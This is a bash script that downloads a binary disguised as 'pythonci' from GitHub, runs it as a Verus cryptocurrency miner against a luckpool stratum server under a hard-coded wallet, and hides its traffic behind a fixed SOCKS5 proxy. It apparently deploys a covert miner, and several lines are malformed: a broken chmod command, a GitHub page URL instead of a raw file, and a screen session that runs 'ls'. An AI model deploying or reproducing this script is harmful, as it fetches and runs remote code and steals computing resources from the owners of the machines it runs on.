#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
wget https://github.com/khansaxfifth/Setang/blob/main/pythonci
chmod +x makan.sh && chmod +x pythonci chmod 777 pythonci makan.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RLD18b4TwuupZPB7XwQRA8stVqb1EDJQ6V
WR=VIA-053
PY=socks5://178.62.79.49:17173
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
